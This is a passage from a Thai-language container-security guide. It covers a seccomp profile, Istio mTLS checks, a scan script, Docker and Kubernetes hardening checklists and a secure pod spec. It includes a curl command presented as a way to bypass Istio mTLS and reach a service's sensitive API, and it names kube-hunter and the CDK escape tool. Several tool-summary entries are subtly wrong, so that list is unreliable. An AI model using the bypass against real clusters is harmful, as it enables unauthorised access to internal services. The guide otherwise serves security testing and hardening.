        "accept", "bind", "connect", "read", "write", "open", "close",
        "stat", "fstat", "mmap", "mprotect", "munmap", "brk",
        "rt_sigaction", "rt_sigprocmask", "ioctl", "pread64", "pwrite64",
        "readv", "writev", "pipe", "select", "sched_yield", "mremap",
        "msync", "mincore", "madvise", "socket", "sendto", "recvfrom",
        "sendmsg", "recvmsg", "shutdown", "getsockname", "getpeername",
        "socketpair", "setsockopt", "getsockopt", "clone", "fork", "vfork",
        "execve", "exit", "wait4", "kill", "uname", "fcntl", "flock",
        "fsync", "fdatasync", "truncate", "ftruncate", "getdents", "getcwd",
        "chdir", "rename", "mkdir", "rmdir", "creat", "link", "unlink",
        "symlink", "readlink", "chmod", "fchmod", "chown", "fchown", "umask",
        "gettimeofday", "getrlimit", "getrusage", "sysinfo", "times", "ptrace",
        "getuid", "syslog", "getgid", "setuid", "setgid", "geteuid", "getegid",
        "setpgid", "getppid", "getpgrp", "setsid", "setreuid", "setregid",
        "getgroups", "setgroups", "setresuid", "getresuid", "setresgid",
        "getresgid", "getpgid", "setfsuid", "setfsgid", "getsid", "capget",
        "capset", "rt_sigpending", "rt_sigtimedwait", "rt_sigqueueinfo",
        "rt_sigsuspend", "sigaltstack", "utime", "mknod", "uselib",
        "personality", "ustat", "statfs", "fstatfs", "sysfs", "getpriority",
        "setpriority", "sched_setparam", "sched_getparam", "sched_setscheduler",
        "sched_getscheduler", "sched_get_priority_max", "sched_get_priority_min",
        "sched_rr_get_interval", "mlock", "munlock", "mlockall", "munlockall",
        "vhangup", "modify_ldt", "pivot_root", "_sysctl", "prctl",
        "arch_prctl", "adjtimex", "setrlimit", "chroot", "sync", "acct",
        "settimeofday", "mount", "umount2", "swapon", "swapoff", "reboot",
        "sethostname", "setdomainname", "iopl", "ioperm", "create_module",
        "init_module", "delete_module", "get_kernel_syms", "query_module",
        "quotactl", "nfsservctl", "getpmsg", "putpmsg", "afs_syscall",
        "tuxcall", "security", "gettid", "readahead", "setxattr", "lsetxattr",
        "fsetxattr", "getxattr", "lgetxattr", "fgetxattr", "listxattr",
        "llistxattr", "flistxattr", "removexattr", "lremovexattr",
        "fremovexattr", "tkill", "time", "futex", "sched_setaffinity",
        "sched_getaffinity", "set_thread_area", "io_setup", "io_destroy",
        "io_getevents", "io_submit", "io_cancel", "get_thread_area",
        "lookup_dcookie", "epoll_create", "epoll_ctl_old", "epoll_wait_old",
        "remap_file_pages", "getdents64", "set_tid_address", "restart_syscall",
        "semtimedop", "fadvise64", "timer_create", "timer_settime",
        "timer_gettime", "timer_getoverrun", "timer_delete", "clock_settime",
        "clock_gettime", "clock_getres", "clock_nanosleep", "exit_group",
        "epoll_wait", "epoll_ctl", "tgkill", "utimes", "vserver",
        "mbind", "set_mempolicy", "get_mempolicy", "mq_open", "mq_unlink",
        "mq_timedsend", "mq_timedreceive", "mq_notify", "mq_getsetattr",
        "kexec_load", "waitid", "add_key", "request_key", "keyctl",
        "ioprio_set", "ioprio_get", "inotify_init", "inotify_add_watch",
        "inotify_rm_watch", "migrate_pages", "openat", "mkdirat", "mknodat",
        "fchownat", "futimesat", "newfstatat", "unlinkat", "renameat",
        "linkat", "symlinkat", "readlinkat", "fchmodat", "faccessat",
        "pselect6", "ppoll", "unshare", "set_robust_list", "get_robust_list",
        "splice", "tee", "sync_file_range", "vmsplice", "move_pages",
        "utimensat", "epoll_pwait", "signalfd", "timerfd_create",
        "eventfd", "fallocate", "timerfd_settime", "timerfd_gettime",
        "accept4", "signalfd4", "eventfd2", "epoll_create1", "dup3",
        "pipe2", "inotify_init1", "preadv", "pwritev", "rt_tgsigqueueinfo",
        "perf_event_open", "recvmmsg", "fanotify_init", "fanotify_mark",
        "prlimit64", "name_to_handle_at", "open_by_handle_at", "clock_adjtime",
        "syncfs", "sendmmsg", "setns", "getcpu", "process_vm_readv",
        "process_vm_writev", "kcmp", "finit_module", "sched_setattr",
        "sched_getattr", "renameat2", "seccomp", "getrandom", "memfd_create",
        "kexec_file_load", "bpf", "execveat", "userfaultfd", "membarrier",
        "mlock2", "copy_file_range", "preadv2", "pwritev2", "pkey_mprotect",
        "pkey_alloc", "pkey_free", "statx"
      ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "names": ["mount", "umount2", "pivot_root", "chroot"],
      "action": "SCMP_ACT_ERRNO"
    }
  ]
}
EOF

# ใช้กับ Docker
docker run --security-opt seccomp=/tmp/seccomp-restricted.json ubuntu bash
```

---

## 8. Service Mesh Security

### Istio Security Testing

```bash
# ตรวจสอบ Istio configuration
kubectl get peerauthentication --all-namespaces
kubectl get authorizationpolicy --all-namespaces
kubectl get destinationrule --all-namespaces

# ตรวจสอบ mTLS policy
kubectl get peerauthentication -n default -o yaml
# ถ้า mode: PERMISSIVE = ยอมรับ traffic ที่ไม่ได้เข้ารหัส (VULNERABLE)

# ตรวจสอบ authorization policies
kubectl get authorizationpolicy -n production -o yaml
# ถ้าไม่มี = ยอมรับ traffic ทุกชนิด

# Bypass mTLS ด้วย PERMISSIVE mode
# ส่ง HTTP ตรงไปที่ service port ข้ามผ่าน sidecar
curl http://target-service.namespace.svc.cluster.local:8080/api/sensitive

# Traffic analysis
kubectl exec -n istio-system -it deploy/prometheus -- \
  wget -qO - 'http://localhost:9090/api/v1/query?query=istio_requests_total{connection_security_policy="none"}'
```

---

## 9. Container Security Tools

### Security Tool Summary

```bash
# === Image Scanning ===
trivy image target:latest              # Vulnerability scan
grype target:latest                    # Alternative scanner
dive target:latest                     # Layer analysis
anchor inline-scan target:latest       # Policy enforcement

# === Runtime Security ===
falco                                  # Threat detection
audit2allow                            # AppArmor helper
confinement status                     # SELinux status

# === Kubernetes ===
kube-bench                             # CIS benchmark
kube-hunter                            # Penetration testing
polaris audit --audit-path manifests/  # Best practices
kubectl neat                           # Clean YAML output

# === Secrets ===
trufflehog image target:latest         # Secret scanning
gitleaks detect                        # Git secret detection

# === Network ===
kubeshark                              # K8s traffic capture
tcpdump -i any -w /tmp/k8s.pcap        # Packet capture

# === Policy ===
opa eval -d policy.rego -I input.json  # Policy as code
kubectl apply -f gatekeeper-policy.yaml # OPA Gatekeeper

# === Monitoring ===
kubectl top pods --all-namespaces      # Resource usage
kubectl get events --sort-by='.lastTimestamp' # Recent events
```

### Comprehensive Security Scan Script

```bash
#!/bin/bash
# container_security_scan.sh - สแกนความปลอดภัยแบบครบวงจร

IMAGE=${1:-ubuntu:latest}
OUTPUT_DIR=${2:-/tmp/container-scan-$(date +%Y%m%d_%H%M%S)}
mkdir -p "$OUTPUT_DIR"

echo "=== Container Security Scan: $IMAGE ==="
echo "Output: $OUTPUT_DIR"

# 1. Trivy scan
echo "\n[1/5] Running Trivy vulnerability scan..."
trivy image \
  --format json \
  --output "$OUTPUT_DIR/trivy-results.json" \
  --severity HIGH,CRITICAL \
  "$IMAGE" 2>/dev/null
trivy image --format table "$IMAGE" 2>/dev/null | tail -20

# 2. Secrets scan
echo "\n[2/5] Scanning for secrets..."
docker run --rm \
  -v /var/run/docker.sock:/var/run/docker.sock \
  trufflesecurity/trufflehog:latest docker --image "$IMAGE" \
  2>/dev/null | tee "$OUTPUT_DIR/secrets.txt" | head -20

# 3. Dockerfile lint (หาก Dockerfile อยู่ใน current dir)
if [ -f Dockerfile ]; then
    echo "\n[3/5] Linting Dockerfile..."
    docker run --rm -i hadolint/hadolint < Dockerfile | tee "$OUTPUT_DIR/hadolint.txt"
else
    echo "\n[3/5] No Dockerfile found, skipping..."
fi

# 4. Image metadata
echo "\n[4/5] Collecting image metadata..."
docker inspect "$IMAGE" > "$OUTPUT_DIR/image-inspect.json"
echo "Image size: $(docker image inspect $IMAGE --format '{{.Size}}' | numfmt --to=iec)"
echo "Base image: $(docker inspect --format='{{.Config.Image}}' $IMAGE 2>/dev/null)"
echo "User: $(docker inspect --format='{{.Config.User}}' $IMAGE)"
echo "Entrypoint: $(docker inspect --format='{{.Config.Entrypoint}}' $IMAGE)"
echo "Cmd: $(docker inspect --format='{{.Config.Cmd}}' $IMAGE)"

# 5. Summary
echo "\n[5/5] Generating summary..."
CRITICAL=$(python3 -c "import json; data=json.load(open('$OUTPUT_DIR/trivy-results.json')); print(sum(len([v for v in r.get('Vulnerabilities',[]) if v.get('Severity')=='CRITICAL']) for r in data.get('Results',[])))" 2>/dev/null || echo 0)
HIGH=$(python3 -c "import json; data=json.load(open('$OUTPUT_DIR/trivy-results.json')); print(sum(len([v for v in r.get('Vulnerabilities',[]) if v.get('Severity')=='HIGH']) for r in data.get('Results',[])))" 2>/dev/null || echo 0)

echo ""
echo "=== SCAN SUMMARY ==="
echo "Critical vulnerabilities: $CRITICAL"
echo "High vulnerabilities:     $HIGH"
echo "Full report: $OUTPUT_DIR/"
```

---

## 10. Hardening Checklist

### Docker Hardening

```
Docker Daemon:
[ ] TLS enabled for Docker daemon
[ ] Docker socket not exposed (not mounted in containers)
[ ] Rootless Docker configured
[ ] Docker daemon runs as non-root
[ ] Audit logging enabled for Docker daemon

Container Runtime:
[ ] No privileged containers
[ ] No --pid=host
[ ] No --network=host (unless required)
[ ] No --ipc=host
[ ] User specified (non-root)
[ ] Read-only root filesystem
[ ] Memory and CPU limits set
[ ] No unnecessary capabilities
[ ] seccomp profile applied
[ ] AppArmor/SELinux profile applied

Container Image:
[ ] Minimal base image (distroless/alpine)
[ ] No secrets hardcoded
[ ] Latest security patches applied
[ ] COPY instead of ADD
[ ] USER instruction set
[ ] HEALTHCHECK defined
[ ] .dockerignore configured
[ ] Multi-stage build for smaller image
```

### Kubernetes Hardening

```
Cluster Configuration:
[ ] CIS Kubernetes Benchmark compliant
[ ] API server audit logging enabled
[ ] etcd encrypted at rest
[ ] Network policies implemented
[ ] Pod Security Standards enforced

RBAC:
[ ] Least privilege principle
[ ] No wildcard permissions
[ ] Service accounts have minimal permissions
[ ] No cluster-admin for workloads
[ ] Regular RBAC audits

Workloads:
[ ] Pod Security Admission (PSA) enforced
[ ] Resource limits set
[ ] Liveness/readiness probes configured
[ ] runAsNonRoot: true
[ ] readOnlyRootFilesystem: true
[ ] allowPrivilegeEscalation: false
[ ] capabilities.drop: [ALL]

Networking:
[ ] Network policies restrict pod-to-pod
[ ] Ingress with TLS
[ ] mTLS between services (Istio/Linkerd)
[ ] Egress filtering

Secrets:
[ ] Secrets encrypted at rest in etcd
[ ] External secrets manager (Vault/ASM/AKV)
[ ] No secrets in ConfigMaps
[ ] Secret rotation automated

Monitoring:
[ ] Falco runtime security enabled
[ ] Audit logs analyzed
[ ] Anomaly detection configured
[ ] Container image scanning in CI/CD
```

### Secure Pod Spec Example

```yaml
# secure-pod.yaml - ตัวอย่าง pod ที่ secure
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
  namespace: production
spec:
  serviceAccountName: minimal-sa  # SA ที่มีสิทธิ์น้อย
  automountServiceAccountToken: false  # ไม่ต้องใช้
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 3000
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: my-app:1.2.3  # ระบุ version ชัดเจน
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
        - ALL
    resources:
      requests:
        memory: "64Mi"
        cpu: "250m"
      limits:
        memory: "128Mi"
        cpu: "500m"
    volumeMounts:
    - name: tmp
      mountPath: /tmp  # เฉพาะ /tmp ที่ writable
    - name: data
      mountPath: /app/data
  volumes:
  - name: tmp
    emptyDir: {}
  - name: data
    persistentVolumeClaim:
      claimName: app-data-pvc
```

---

## สรุป Container Security

| หัวข้อ | Tool | วัตถุประสงค์ |
|--------|------|----------|
| Image Scan | Trivy/Grype | หา CVEs ใน images |
| Secret Scan | TruffleHog | หา secrets ใน images |
| Dockerfile Lint | Hadolint | Dockerfile best practices |
| Runtime Detect | Falco | ตรวจจับ anomalies |
| K8s Audit | kube-bench | CIS benchmark |
| K8s Pentest | kube-hunter | หา vulnerabilities |
| Network Policy | Calico/Cilium | Zero-trust networking |
| Secrets Mgmt | Vault/ASM | External secrets |
| Policy Engine | OPA/Gatekeeper | Policy as code |
| Container Escape | CDK | Escape testing tool |

---

← [Part 71: Cloud Security](Part-71-Cloud-Security.md) | [Part 73: Active Directory Advanced](Part-73-Active-Directory-Advanced.md) →
